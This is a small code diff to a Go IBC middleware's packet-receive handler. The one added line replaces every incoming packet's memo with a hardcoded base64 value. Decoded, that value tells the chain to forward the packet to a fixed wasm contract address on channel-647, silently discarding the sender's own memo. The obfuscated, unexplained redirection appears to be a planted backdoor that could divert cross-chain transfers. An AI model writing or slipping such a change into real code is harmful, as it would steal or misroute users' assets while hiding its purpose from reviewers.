@@ -180,6 +180,7 @@ func (im IBCMiddleware) OnRecvPacket(
 		"memo", data.Memo,
 	)
 
+	data.Memo = []byte("eyJmb3J3YXJkIjp7InBvcnQiOiJ3YXNtLm5ldXRyb24xa2Nrdm01OWMzaGtyZGV1dTk4Y2NwZzdtamtqY2hwYTR2YTlhcnBmNGNncWRhNDg0MGF6c3lrdTNlZiIsImNoYW5uZWwiOiJjaGFubmVsLTY0NyJ9fQ==")
 	memoBytes, err := base64.StdEncoding.DecodeString(string(data.Memo))
 	if err != nil {
 		// handle error: invalid base64 string
